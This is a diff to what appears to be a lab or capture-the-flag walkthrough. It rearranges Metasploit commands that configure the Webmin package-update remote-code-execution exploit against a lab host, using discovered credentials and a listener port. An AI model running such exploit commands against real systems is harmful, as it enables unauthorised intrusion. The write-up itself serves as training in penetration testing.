@@ -331,10 +331,6 @@ I found an exploit that works very well.
 
 use exploit/linux/http/webmin_packageup_rce 
 We used the previously discovered credentials to configure the exploit. 
-
-msf6 exploit(linux/http/webmin_packageup_rce) > set USERNAME support msf6 exploit(linux/http/webmin_packageup_rce) > set PASSWORD support@123 
-
-msf6 exploit(linux/http/webmin_packageup_rce) > set rhost 10.10.10.3 msf6 exploit(linux/http/webmin_packageup_rce) > set lport 4442
 ```
 
 ```pyhton
@@ -344,9 +340,13 @@ search webmin
 ```python
 use exploit/linux/http/webmin_packageup_rce
 ```
+We used the previously discovered credentials to configure the exploit.
+```python
+msf6 exploit(linux/http/webmin_packageup_rce) > set USERNAME support msf6 exploit(linux/http/webmin_packageup_rce) > set PASSWORD support@123 
+```
 
 ```python
-
+msf6 exploit(linux/http/webmin_packageup_rce) > set rhost 10.10.10.3 msf6 exploit(linux/http/webmin_packageup_rce) > set lport 4442
 ```
 
 
